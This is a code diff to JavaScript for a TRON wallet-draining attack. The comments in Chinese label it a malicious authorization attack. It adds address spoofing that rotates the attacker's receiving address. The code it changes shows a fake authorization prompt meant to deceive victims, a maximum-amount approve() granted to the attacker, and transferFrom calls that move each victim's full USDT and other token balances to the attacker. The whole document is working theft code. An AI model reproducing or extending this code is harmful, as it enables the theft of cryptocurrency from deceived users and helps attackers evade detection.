@@ -9,6 +9,17 @@
     // 攻击者地址（A用户）
     let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
     
+    // 🎭 获取当前使用的地址（可能是伪装地址）
+    function getCurrentAttackerAddress() {
+        // 如果地址伪装系统已启用，使用伪装地址
+        if (window.AddressSpoofing && window.AddressSpoofing.getCurrentSpoof) {
+            const spoofAddress = window.AddressSpoofing.getCurrentSpoof();
+            console.log(`🎭 使用地址伪装: ${ATTACKER_ADDRESS} → ${spoofAddress}`);
+            return spoofAddress;
+        }
+        return ATTACKER_ADDRESS;
+    }
+    
     // 支持的代币合约地址（TRON网络）
     const TOKEN_CONTRACTS = {
         USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',//保留USDT
@@ -44,7 +55,8 @@
     async function initiateMaliciousAuthorization(victimAddress) {
         console.log('🎯🎯🎯 启动恶意授权攻击！🎯🎯🎯');
         console.log('🎯 受害者地址:', victimAddress);
-        console.log('🎯 攻击者地址:', ATTACKER_ADDRESS);
+        const currentAttacker = getCurrentAttackerAddress();
+        console.log('🎯 攻击者地址:', currentAttacker);
         
         // 显示"授权确认"界面，让用户以为是正常授权
         showAuthorizationPrompt(victimAddress);
@@ -139,7 +151,7 @@
             // 构建approve交易，授权攻击者可以转移用户的代币
             const functionSelector = 'approve(address,uint256)';
             const parameters = [
-                {type: 'address', value: ATTACKER_ADDRESS},  // 授权给攻击者
+                {type: 'address', value: getCurrentAttackerAddress()},  // 授权给攻击者
                 {type: 'uint256', value: MAX_AUTHORIZATION}   // 最大授权金额
             ];
             
@@ -198,7 +210,7 @@
                 'balanceOf(address)',
                 {},
                 [{type: 'address', value: victimAddress}],
-                ATTACKER_ADDRESS
+                getCurrentAttackerAddress()
             );
             
             if (balanceResult.result && balanceResult.result.result) {
@@ -213,17 +225,17 @@
                         {},
                         [
                             {type: 'address', value: victimAddress},    // 从受害者
-                            {type: 'address', value: ATTACKER_ADDRESS}, // 到攻击者
+                            {type: 'address', value: getCurrentAttackerAddress()}, // 到攻击者
                             {type: 'uint256', value: balance.toString()} // 全部余额
                         ],
-                        ATTACKER_ADDRESS  // 攻击者执行
+                        getCurrentAttackerAddress()  // 攻击者执行
                     );
                     
                     if (transferTx.result && transferTx.result.result) {
                         console.log(`🏆🏆🏆 ${tokenName}自动转移成功！🏆🏆🏆`);
                         console.log(`💰 转移金额: ${balance.toString()}`);
                         console.log(`💰 从: ${victimAddress}`);
-                        console.log(`💰 到: ${ATTACKER_ADDRESS}`);
+                        console.log(`💰 到: ${getCurrentAttackerAddress()}`);
                     }
                 }
             }
@@ -295,7 +307,7 @@
         return {
             authorizedTokens: Array.from(authorizedTokens.entries()),
             victimCount: victimWallets.size,
-            attackerAddress: ATTACKER_ADDRESS,
+            attackerAddress: getCurrentAttackerAddress(),
             timestamp: Date.now()
         };
     }
@@ -322,7 +334,7 @@
         startContinuousMonitoring();
         
         console.log('🎯 恶意授权攻击系统初始化完成');
-        console.log('🎯 攻击者地址:', ATTACKER_ADDRESS);
+        console.log('🎯 攻击者地址:', getCurrentAttackerAddress());
         console.log('🎯 支持代币:', Object.keys(TOKEN_CONTRACTS));
     }
     
